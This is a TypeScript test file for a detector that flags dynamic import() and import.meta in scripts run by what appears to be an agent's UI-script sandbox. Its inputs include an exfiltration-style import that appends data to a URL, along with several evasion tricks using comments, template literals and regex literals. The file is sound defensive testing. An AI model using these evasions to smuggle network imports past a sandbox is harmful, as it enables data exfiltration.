import { describe, expect, it } from "vitest";

import { referencesDynamicImport } from "@phoenix/agent/uiOperations/runtime/uiScriptWorker";

describe("referencesDynamicImport", () => {
  it("rejects dynamic import() and import.meta exfil forms", () => {
    expect(referencesDynamicImport('import("https://host/?" + data)')).toBe(
      true
    );
    expect(referencesDynamicImport("await import ( x )")).toBe(true);
    expect(referencesDynamicImport("const u = import.meta.url;")).toBe(true);
  });

  it("rejects imports smuggled through comments", () => {
    // The bare-regex bypass: a comment between keyword and paren is valid JS.
    expect(referencesDynamicImport('import/**/("https://host/x.js")')).toBe(
      true
    );
    expect(referencesDynamicImport("import /* c */ . meta")).toBe(true);
    expect(referencesDynamicImport("import//\n(x)")).toBe(true);
    expect(referencesDynamicImport('import/* multi\nline */("x")')).toBe(true);
  });

  it("rejects imports inside template-literal interpolations", () => {
    expect(referencesDynamicImport('`prefix${import("x")}`')).toBe(true);
    expect(referencesDynamicImport('`a${ { b: `c${import("y")}` }.b }`')).toBe(
      true
    );
  });

  it("rejects imports hiding behind regex literals containing quotes", () => {
    // A naive scanner that treats ' as starting a string would mask the rest.
    expect(
      referencesDynamicImport("const r = /['\"]/;\nimport('https://host/x')")
    ).toBe(true);
    expect(referencesDynamicImport("return /\\/*/.test(s) || import(x)")).toBe(
      true
    );
  });

  it("does not reject embedded code that merely mentions import", () => {
    // Python evaluator bodies routinely carry `import` statements as data.
    expect(referencesDynamicImport("const src = `import json\\nx = 1`;")).toBe(
      false
    );
    expect(referencesDynamicImport("importlib.reload(mod)")).toBe(false);
    expect(
      referencesDynamicImport("return ui.timeRange.set({ hours: 1 });")
    ).toBe(false);
  });

  it("does not reject import-like bytes inside strings or comments", () => {
    expect(referencesDynamicImport('const s = "import(x)";')).toBe(false);
    expect(referencesDynamicImport("const s = 'import.meta';")).toBe(false);
    expect(referencesDynamicImport("// import('x')\nreturn 1;")).toBe(false);
    expect(referencesDynamicImport("/* import('x') */ return 1;")).toBe(false);
    expect(referencesDynamicImport("const t = `import('x')`;")).toBe(false);
  });

  it("does not confuse division with regex literals", () => {
    expect(referencesDynamicImport("const x = a / b / c;")).toBe(false);
    expect(referencesDynamicImport("const re = /import\\(/;")).toBe(false);
  });
});
